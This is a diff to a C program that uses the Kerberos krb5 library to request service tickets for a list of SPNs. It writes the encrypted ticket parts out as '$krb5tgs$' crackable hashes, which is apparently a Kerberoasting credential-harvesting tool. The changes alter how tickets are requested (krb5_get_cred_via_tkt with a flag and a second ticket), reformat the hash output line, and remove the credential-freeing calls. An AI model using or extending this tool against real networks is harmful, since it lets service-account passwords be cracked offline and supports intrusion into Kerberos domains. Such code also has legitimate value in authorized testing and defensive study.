@@ -132,7 +132,10 @@ int main(int argc, char *argv[])
       retval = krb5_parse_name(context, client_full, &tgs_creds.client);
       retval = krb5_parse_name(context, service_full, &tgs_creds.server);
       tgs_creds.keyblock.enctype = enc_type;
-      retval = krb5_get_credentials(context, 0,cc, &tgs_creds, &point_service_creds);
+      tgs_creds.authdata = NULL;
+      tgs_creds.second_ticket = tgt_creds.ticket;
+      retval = krb5_get_cred_via_tkt(context, &tgt_creds, 0x40000000, NULL,&tgs_creds, &point_service_creds);
+
       if (retval) {
           printf("%s\n","TGS not found");
       }
@@ -167,7 +170,7 @@ int main(int argc, char *argv[])
                           checksum[h] = hex_ticket[y+6+h+(cipher_length * 2) - 24];
                       }
                       checksum[h] = 0;
-                      fprintf(fptr_hashes, "$krb5tgs$%d$%s%s$%s$%s$%s\n",enc_type,spns[i],hosts[p],realm,checksum,cipher);
+                      fprintf(fptr_hashes, "$krb5tgs$%d$%s$%s$%s$%s\n",enc_type,spns[i],realm,checksum,cipher);
                   }
                   if(hex_ticket[y+2] == '8' && hex_ticket[y+3] == '2' && hex_ticket[y+4] == '0' && hex_ticket[y+5] == '1')
                   {
@@ -187,7 +190,9 @@ int main(int argc, char *argv[])
            retval = krb5_parse_name(context, client_full, &tgs_creds.client);
            retval = krb5_parse_name(context, service_full, &tgs_creds.server);
            tgs_creds.keyblock.enctype = enc_type;
-           retval = krb5_get_credentials(context, 0,cc, &tgs_creds, &point_service_creds);
+           tgs_creds.authdata = NULL;
+           tgs_creds.second_ticket = tgt_creds.ticket;
+           retval = krb5_get_cred_via_tkt(context, &tgt_creds, 0x40000000, NULL,&tgs_creds, &point_service_creds);
            if (retval) {
                printf("%s\n","TGS not found");
            }
@@ -235,8 +240,6 @@ int main(int argc, char *argv[])
        }
    }
 
-   krb5_free_creds(context, point_service_creds);
-   krb5_free_creds(context, &tgt_creds);
    krb5_cc_close(context, cc);
    krb5_free_context(context);
    return 0;
